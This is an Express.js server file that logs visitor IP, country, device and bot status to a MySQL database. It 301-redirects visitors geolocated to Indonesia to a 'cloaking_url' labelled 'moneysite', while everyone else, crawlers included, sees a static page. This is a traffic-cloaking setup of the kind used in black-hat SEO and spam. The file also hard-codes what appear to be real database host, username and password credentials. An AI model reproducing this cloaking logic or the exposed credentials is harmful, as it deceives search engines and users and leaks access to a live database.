const express = require("express");
const path = require("path");
const mysql = require("mysql2/promise");
const geoip = require("geoip-lite");
const DeviceDetector = require("device-detector-js");
const BotDetector = require("device-detector-js/dist/parsers/bot");

const app = express();

const dbConfig = {
  host: "sepurldb-do-user-13089821-0.c.db.ondigitalocean.com",
  user: "doadmin",
  password: "AVNS_Dc4CVDsW6D558Ism5Dv",
  port: 25060,
  database: "defaultdb",
};

async function initializeDatabaseConnection() {
  try {
    const connection = await mysql.createConnection(dbConfig);
    console.log("Database Connected Successfully");
    return connection;
  } catch (error) {
    console.error("Database Connection FAILED", error);
    process.exit(1);
  }
}

const connectionPromise = initializeDatabaseConnection();

app.use(async (req, res, next) => {
  if (req.path === "/") {
    try {
      const connection = await connectionPromise;
      const [results] = await connection.query(
        "SELECT * FROM links WHERE id=0 LIMIT 1"
      );

      const listIP =
        req.headers["x-real-ip"] ||
        req.headers["x-forwarded-for"] ||
        req.connection.remoteAddress;
      const clientIP = listIP.split(",")[0].trim();
      const referer = req.headers.referer || "Direct visit";
      const userAgent = req.headers["user-agent"] || "Unknown";
      const deviceDetector = new DeviceDetector();
      const botDetector = new BotDetector();
      const result = deviceDetector.parse(userAgent);
      const bot = botDetector.parse(userAgent);
      const geo = geoip.lookup(clientIP);
      const country = geo ? geo.country : "Unknown";

      const os = result.os ? result.os.name : "Unknown";
      const device = result.device ? result.device.type : "Unknown";
      const browser = result.client ? result.client.name : "Unknown";
      const botDetect = bot ? bot.name : "Human";

      console.log("Visitor IP:", clientIP);
      console.log("Visitor Country:", country);
      console.log("Visitor Referer:", referer);
      console.log("Visitor User Agent:", userAgent);
      console.log("Visitor OS:", os);
      console.log("Visitor Device:", device);
      console.log("Visitor Browser:", browser);
      console.log("Visitor is:", botDetect);

      const blackURL = results[0].cloaking_url;

      const sql = 'INSERT INTO visitors (linkid, ipaddress, bot, referer, device, os, browser, country) VALUES (?, ?, ?, ?, ?, ?, ?, ?)';
      await connection.query(sql, [0, clientIP, botDetect, referer, device, os, browser, country]);

      if (country === 'ID') {
        console.log('Redirect moneysite');
        return res.redirect(301, blackURL);
      } else {
        console.log('Tidak redirect');
        next();
      }
    } catch (error) {
      console.error("Error:", error);
      res.status(500).json({
        status: "notok",
        message: "OOPS! Something Went Wrong",
      });
    }
  } else {
    next();
  }
});

app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.all("*", (req, res) => {
    res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

const PORT = 3232;

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
